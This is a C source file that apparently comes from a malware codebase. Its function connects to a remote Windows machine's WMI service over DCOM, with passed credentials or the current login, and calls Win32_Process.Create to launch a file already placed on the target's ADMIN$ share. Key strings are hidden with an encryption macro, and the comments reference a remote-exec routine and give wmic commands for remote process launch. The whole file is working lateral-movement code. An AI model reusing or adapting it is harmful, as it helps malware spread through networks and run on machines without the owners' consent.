/*

	WMI.c
	C routines to use WMI DCOM interface for remote process creation
	NB: should be compiled as C code, not C++
*/

#define _WIN32_WINNT 0x0400
#define _WIN32_DCOM

#include <windows.h>
#include <wbemidl.h>

#include "..\inc\mem.h"
#include "..\inc\dbg.h"
#include "..\inc\CryptoStrings.h"


#pragma comment (lib, "wbemuuid.lib")


#include "WMI.h"

/*
Used by drRemoteExec() internally, attempts to remotely exec file using WMI DCOM interface
NB: use %windir% or %SystemRoot% in path instead of c:\windows, because system may be placed on different drive or path on remote system
In order WMI to work properly, windows firewall on target machine should be configured properly. Otherwise, a call will hang for a 1-2 mins and return RPC unavailable error

For the reference:
WMIC possible cmdlines
wmic /node:"<WS-MACHINE-NAME>" process call create "<PROCESS START CMDLINE>"
wmic /node:"<WS-MACHINE-NAME>" /user:<USERNAME> /password:<PASSWORD> process call create "<PROCESS START CMDLINE>"

	wszRemoteFilename - filename placed to ADMIN$ (c:\windows) share, format 'filename.ext'
*/

BOOL wmiStartRemoteProcess(LPWSTR wszTargetMachine, LPWSTR wszRemoteFilename, LPWSTR wszUsername, LPWSTR wszPassword)
{
	BOOL bRes = FALSE;	// func result

	// result code from COM calls
	HRESULT hr = 0;

	// COM interface pointers
	IWbemLocator         *locator = NULL;
	IWbemServices        *services = NULL;
	IEnumWbemClassObject *results = NULL;
	IWbemClassObject     *pProcess = NULL;	// Win32_Process object
	IWbemClassObject     *pInParameters = NULL;
	IWbemClassObject     *pMethodObject = NULL;
	IWbemClassObject      *pOutInst = NULL;

	LPWSTR wszS;	// decrypt buffer
	LPWSTR wszNameBuff;	// buffer to hold resulting target name

	BSTR resource;
	BSTR bstrWin32Process, bstrCreate, bstrCommandLine;
	VARIANT vCommandLine;

	// optional, used if username or password passed
	BSTR bstrUsername = NULL, bstrPassword = NULL;

	LPWSTR wszRemoteCmdLine;	// remote commandline

	// alloc mem for buffer
	wszNameBuff = (LPWSTR)my_alloc(1024);

	// prepare wszNameBuff
	lstrcpy(wszNameBuff, wszTargetMachine);
	wszS = CRSTRW("\\ROOT\\CIMV2", "\xfe\x5f\x4d\x07\xf5\x5f\x71\x3d\xc1\x68\x99\xd3\x2d\x8e\xa0\xf9\x7c\x32\xc8");
	lstrcat(wszNameBuff, wszS);
	my_free(wszS);
	DbgPrint("target path [%ws]", wszNameBuff);

	do {	// not a loop

		// initialize COM
		hr = CoInitializeEx(0, COINIT_MULTITHREADED); if (S_OK != hr) { DbgPrint("ERR: CoInitializeEx() failed"); break;  }
		hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL); if (S_OK != hr) { DbgPrint("ERR: CoInitializeSecurity() failed"); break; }


		// BSTR strings we'll use (http://msdn.microsoft.com/en-us/library/ms221069.aspx)
		resource = SysAllocString(wszNameBuff);
		//BSTR language = SysAllocString(L"WQL");
		//BSTR query = SysAllocString(L"SELECT * FROM Win32_Processor");


		/*
	#ifdef _DEBUG
		DbgPrint("DBG: FUNCTION TEMPORARY DISABLED, exiting");
		return FALSE;
	#endif
		*/

		DbgPrint("entered");

		// check if creds passed
		if (wszUsername) { bstrUsername = SysAllocString(wszUsername); }
		if (wszPassword) { bstrPassword = SysAllocString(wszPassword); }

		// init other BSTR's using encrypted strings
		wszS = CRSTRW("Win32_Process", "\xff\xdf\x3d\x0b\xf2\xdf\x0a\x0a\xe1\x94\x8f\xdc\x3f\x35\xf2\xc0\x2a\x14\x8e");
		bstrWin32Process = SysAllocString(wszS);
		my_free(wszS);

		wszS = CRSTRW("Create", "\xfc\x1f\x51\x02\xfa\x1f\x72\x18\xe9\x06\xa5\xef\xe0\x3a\xb3");
		bstrCreate = SysAllocString(wszS);
		my_free(wszS);

		wszS = CRSTRW("CommandLine", "\xff\xff\x75\x0b\xf4\xff\x56\x0c\xe2\xea\x94\xed\x0b\x2b\xbc\xcd\x2a\xf2\x42");
		bstrCommandLine = SysAllocString(wszS);
		my_free(wszS);


		// connect to WMI
		hr = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID *)&locator); if (S_OK != hr) { DbgPrint("ERR: CoCreateInstance() failed"); break; }
		
		if (wszUsername && wszPassword) {
			// connection using passed creds
			DbgPrint("connecting using creds");
			hr = locator->lpVtbl->ConnectServer(locator, resource, bstrUsername, bstrPassword, NULL, 0, NULL, NULL, &services); if (S_OK != hr) { DbgPrint("ERR: locator->lpVtbl->ConnectServer() failed"); break; }
		} else {
			// no creds, use current context
			DbgPrint("connecting using current context");
			hr = locator->lpVtbl->ConnectServer(locator, resource, NULL, NULL, NULL, 0, NULL, NULL, &services); if (S_OK != hr) { DbgPrint("ERR: locator->lpVtbl->ConnectServer() failed"); break; }
		}

		// get Win32_Process object
		hr = services->lpVtbl->GetObject(services, bstrWin32Process, 0, NULL, &pProcess, NULL); if (S_OK != hr) { DbgPrint("ERR: GetObject(Win32_Process) failed"); break; }

		// get Win32_process->Create
		hr = pProcess->lpVtbl->GetMethod(pProcess, bstrCreate, 0, &pInParameters, NULL); if (S_OK != hr) { DbgPrint("ERR: GetMethod(Win32_Process->Create) failed"); break; }

		hr = pInParameters->lpVtbl->SpawnInstance(pInParameters, 0, &pMethodObject); if (S_OK != hr) { DbgPrint("ERR: SpawnInstance() failed"); break; }
		
		// prepare remote commandline to be started
		/*
		wszRemoteCmdLine = (LPWSTR)my_alloc(1024);
		wszS = CRSTRW("%windir%\\", "\xfe\x7f\x50\x09\xf7\x7f\x15\x16\xe7\x69\xb4\xe8\x1c\xc2\xac");
		lstrcpy(wszRemoteCmdLine, wszS);
		lstrcat(wszRemoteCmdLine, wszRemoteFilename);
		DbgPrint("remote cmdline [%ws]", wszRemoteCmdLine);
		vCommandLine.vt = VT_BSTR;
		vCommandLine.bstrVal = SysAllocString(wszRemoteCmdLine);
		my_free(wszRemoteCmdLine);
		*/
		// use just a filename, wmiprvse.exe, a WMI serving app will try %windir% itself
		vCommandLine.vt = VT_BSTR;
		vCommandLine.bstrVal = SysAllocString(wszRemoteFilename);

		// set param
		hr = pMethodObject->lpVtbl->Put(pMethodObject, bstrCommandLine, 0, &vCommandLine, 0); if (S_OK != hr) { DbgPrint("ERR: ->Put(CommandLine) failed"); break; }

		// exec method
		// NB: successfull method execution does not guarantee a new process creation (for ex. with invalid commandline)
		hr = services->lpVtbl->ExecMethod(services, bstrWin32Process, bstrCreate, 0, NULL, pMethodObject, &pOutInst, NULL); if (S_OK != hr) { DbgPrint("ERR: ExecMethod() failed"); break; }

		// if we got here -> done ok
		DbgPrint("SUCCESS");
		bRes = TRUE;

		/*
		// issue a WMI query
		hr = services->lpVtbl->ExecQuery(services, language, query, WBEM_FLAG_BIDIRECTIONAL, NULL, &results); if (S_OK != hr) { DbgPrint("ERR: services->lpVtbl->ExecQuery() failed"); break; }

		// list the query results
		if (results != NULL) {
			IWbemClassObject *result = NULL;
			ULONG returnedCount = 0;

			// enumerate the retrieved objects
			while ((hr = results->lpVtbl->Next(results, WBEM_INFINITE, 1, &result, &returnedCount)) == S_OK) {
				VARIANT name;
				VARIANT speed;

				// obtain the desired properties of the next result and print them out
				hr = result->lpVtbl->Get(result, L"Name", 0, &name, 0, 0);
				hr = result->lpVtbl->Get(result, L"MaxClockSpeed", 0, &speed, 0, 0);
				DbgPrint("CPU %s, %dMHz", name.bstrVal, speed.intVal);

				// release the current result object
				result->lpVtbl->Release(result);
			}
		} else { DbgPrint("ERR: ExecQuery failed"); break;}
		*/

	} while (FALSE); // not a loop

	// release WMI COM interfaces
	if (results) { results->lpVtbl->Release(results); }
	if (services) { services->lpVtbl->Release(services); }
	if (locator) { locator->lpVtbl->Release(locator); }
	if (pProcess) { pProcess->lpVtbl->Release(pProcess); }
	if (pInParameters) { pInParameters->lpVtbl->Release(pInParameters); }
	if (pMethodObject) { pMethodObject->lpVtbl->Release(pMethodObject); }
	if (pOutInst) { pOutInst->lpVtbl->Release(pOutInst); }

	// unwind everything else we've allocated
	CoUninitialize();

//	SysFreeString(query);
//	SysFreeString(language);
	SysFreeString(resource);
	SysFreeString(vCommandLine.bstrVal);

	// free opt strings
	if (wszUsername) { SysFreeString(bstrUsername); }
	if (wszPassword) { SysFreeString(bstrPassword); }

	// free mem
	my_free(wszNameBuff);

	return bRes;
}